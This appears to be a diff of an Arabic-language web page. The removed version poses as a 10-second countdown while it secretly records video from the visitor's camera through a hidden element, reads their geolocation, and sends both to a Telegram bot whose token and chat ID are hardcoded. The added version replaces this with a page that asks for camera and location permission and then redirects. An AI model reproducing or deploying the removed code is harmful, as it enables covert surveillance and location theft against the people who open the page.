@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الانتظار 10 ثوانٍ</title>
+    <title>طلب الأذونات</title>
     <style>
         body {
             display: flex;
@@ -11,160 +11,59 @@
             align-items: center;
             justify-content: center;
             height: 100vh;
+            background-color: #f0f8ff;
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
             direction: rtl;
         }
-        .countdown-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+        .container {
+            width: 300px;
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
         }
-        .progress-circle {
-            position: relative;
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            background: conic-gradient(#00bfff calc(var(--progress) * 1%), #ccc 0%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
+        h1 {
+            margin: 0;
+            font-size: 28px;
             color: #333;
-            --progress: 100;
         }
         p {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #333;
+            margin: 15px 0;
+            color: #555;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <div class="countdown-container">
-        <div class="progress-circle" id="progressCircle">10</div>
-        <p>يرجى الانتظار، سيتم الانتقال تلقائيًا بعد 10 ثوانٍ...</p>
+    <div class="container">
+        <h1>مرحبا بك!</h1>
+        <p>لإتمام العملية، يرجى السماح بالوصول إلى الكاميرا والموقع.</p>
+        <button id="requestPermissions">السماح بالأذونات</button>
     </div>
-    <video id="video" autoplay playsinline style="display: none;"></video>
-    
+
     <script>
-        let countdown = 10;
-        let intervalId;
-        let mediaRecorder;
-        let recordedChunks = [];
-        let latitude = 'لم يُسمح بالوصول إلى الموقع';
-        let longitude = 'لم يُسمح بالوصول إلى الموقع';
-
-        async function requestPermissions() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                return stream;
-            } catch (err) {
-                console.error('خطأ في الحصول على الأذونات: ', err);
-                return null;
-            }
-        }
-
-        async function getLocation() {
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    latitude = position.coords.latitude;
-                    longitude = position.coords.longitude;
-                    resolve();
-                }, (error) => {
-                    console.error('خطأ في الحصول على الموقع: ', error);
-                    resolve();
-                });
+        document.getElementById('requestPermissions').onclick = async () => {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            await navigator.geolocation.getCurrentPosition(() => {
+                window.location.href = "second.html"; // الانتقال للصفحة الثانية بعد الحصول على الأذونات
+            }, () => {
+                alert('لم يُسمح بالوصول إلى الموقع');
             });
-        }
-
-        async function startCountdown() {
-            const stream = await requestPermissions();
-            await getLocation();
-
-            if (stream) {
-                document.getElementById('video').srcObject = stream;
-                mediaRecorder = new MediaRecorder(stream);
-
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-
-                mediaRecorder.onstop = () => {
-                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    recordedChunks = [];
-                    sendToTelegram(videoBlob);
-                };
-
-                mediaRecorder.start();
-                intervalId = setInterval(updateCountdown, 1000);
-
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 10000); // مدة الفيديو 10 ثوانٍ
-            }
-        }
-
-        function updateCountdown() {
-            countdown--;
-            document.getElementById('progressCircle').style.setProperty('--progress', (countdown / 10) * 100);
-            document.getElementById('progressCircle').textContent = countdown;
-
-            if (countdown === 0) {
-                clearInterval(intervalId);
-                window.location.href = 'final_page.html'; // الانتقال إلى الصفحة النهائية
-            }
-        }
-
-        function sendToTelegram(videoBlob) {
-            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
-            const chatId = '6185375878';
-
-            const messageContent = `
-#رسالة_2:
-🎯 إحداثيات الموقع:
-🌍 Latitude: ${latitude}
-🌍 Longitude: ${longitude}
-`;
-
-            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
-            const apiUrlMedia = `https://api.telegram.org/bot${token}/sendVideo`;
-
-            fetch(apiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: messageContent
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('تم إرسال الرسالة إلى Telegram:', data);
-                
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('video', videoBlob, 'video.webm');
-                formData.append('caption', messageContent);
-
-                return fetch(apiUrlMedia, {
-                    method: 'POST',
-                    body: formData
-                });
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('تم إرسال الفيديو إلى Telegram:', data);
-            })
-            .catch(error => {
-                console.error('خطأ في إرسال الفيديو إلى Telegram: ', error);
-            });
-        }
-
-        startCountdown(); // بدء العد التنازلي
+        };
     </script>
 </body>
 </html>
